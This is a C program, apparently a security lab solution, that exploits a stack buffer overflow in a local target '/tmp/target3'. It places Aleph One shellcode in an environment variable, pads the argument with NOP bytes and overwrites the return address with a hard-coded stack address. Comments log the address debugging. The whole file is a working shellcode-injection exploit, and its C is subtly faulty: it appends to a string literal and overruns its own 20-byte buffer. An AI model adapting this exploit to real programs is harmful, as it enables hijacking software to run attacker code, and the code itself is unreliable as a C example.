#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[20];
  memset(str, 0, 20);

  // fake RET + fake SFP 
  // AAAAAAAAAAAA\x9b\xff\xff\xbf\xdc\xfd\xff\xbf
  // \x9b\xff\xff\xbf\xdc\xfd\xff\xbf 

  for (int i = 0; i < 16; i++)
  {
  	strcat(str, "\x90");
  }
  // Segfault:
  // strcat(str, "\x97\xff\xff\xbf");
  // env: 0xbfffff97:	0xdb31c031
  strcat(str, "\x9f\xff\xff\xbf");
  
  args[0] = TARGET;
  // max input size is 4 * 5 = 20
  args[1] = str;
  args[2] = NULL;


  char *str2 = "randomstr\x90\x90\x90\x90\x9f\xff\xff\xbf";
  strcat(str2, shellcodeAlephOne);
  env[0] = str2;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");
  return 0;
}


